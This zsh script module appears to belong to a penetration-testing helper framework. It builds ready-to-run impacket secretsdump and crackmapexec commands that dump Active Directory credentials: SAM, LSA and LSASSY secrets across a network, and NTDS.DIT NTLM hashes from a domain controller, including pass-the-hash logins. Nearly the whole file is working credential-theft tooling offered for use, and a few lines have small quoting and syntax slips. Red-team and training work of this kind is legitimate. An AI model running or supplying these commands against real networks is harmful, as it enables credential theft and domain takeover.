#!/usr/bin/env zsh

############################################################# 
# nb-ad-dump
#############################################################
nb-ad-dump-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-dump
------------
The nb-ad-dump namespace contains commands for hash dumping in Active Directory environment.

Commands
--------
nb-ad-dump-install         installs dependencies
nb-ad-dump-secrets-local   dump secrets from the SAM system hives
nb-ad-dump-secrets         dump secrets from the remote machine
nb-ad-dump-ntds            extract only NTDS.DIT data (NTLM hashes only)
nb-ad-dump-cme-ntds        extract only NTDS.DIT data with CME (NTLM hashes only)
nb-ad-dump-cme-sam         dump SAM hashes
nb-ad-dump-cme-lsa         dump LSA hashes
nb-ad-dump-cme-lsassy      dump LSASSY hashes

DOC
}

nb-ad-dump-secrets-local() {
    __check-project

    __ask "Select a SAM.save file"
    local sam && __askpath sam FILE $(pwd)

    __ask "Select a SECURITY.save file"
    local sec __askpath sec FILE $(pwd)

    __ask "Select a SYSTEM.save file"
    local sys && __askpath sys FILE $(pwd)

    print -z "secretsdump.py -sam $sam -security $sec -system $sys LOCAL"
}

nb-ad-dump-install() {
    __info "Running $0..."
    __pkgs impacket crackmapexec
}

nb-ad-dump-secrets() {
    __check-project
    __check-domain
    __check-user

    __ask "Provide target machine IP"
    nb-vars-set-rhost
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        __check-pass
        print -z "secretsdump.py ${__DOMAIN}/${__USER}:\"${__PASS}\"@${__RHOST} | tee ${__domainadpath}/${__USER}-hashdump.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter THE WHOLE NT:LM hash for authentication"
        __check-hash
        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} | tee ${__domainadpath}/${__USER}-hashdump.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-dump-ntds() {
    __check-project
    __check-domain

    __ask "Provide IP of domain controller"
    nb-vars-set-rhost

    __ask "Provide domain admin username"
    nb-vars-set-user
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a domain admin password for authentication"
        nb-vars-set-pass
        print -z "secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} -just-dc-ntlm | tee ${__domainadpath}/NTDS-hashdump.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the domain admin NTLM hash for authentication"
        nb-vars-set-pass
        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee ${__domainadpath}/NTDS-hashdump.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-dump-cme-ntds() {
    __check-project

    __ask "Provide IP of domain controller"
    nb-vars-set-rhost

    __ask "Provide domain admin username"
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --ntds | tee ${__domainadpath}/NTDS-hashdump.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --ntds | tee ${__domainadpath}/NTDS-hashdump.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the domain admin NTLM hash for authentication"
        nb-vars-set-pass
        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee ${__domainadpath}/NTDS-hashdump.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-dump-cme-sam() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-dump-cme-lsa() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-dump-cme-lsassy() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}
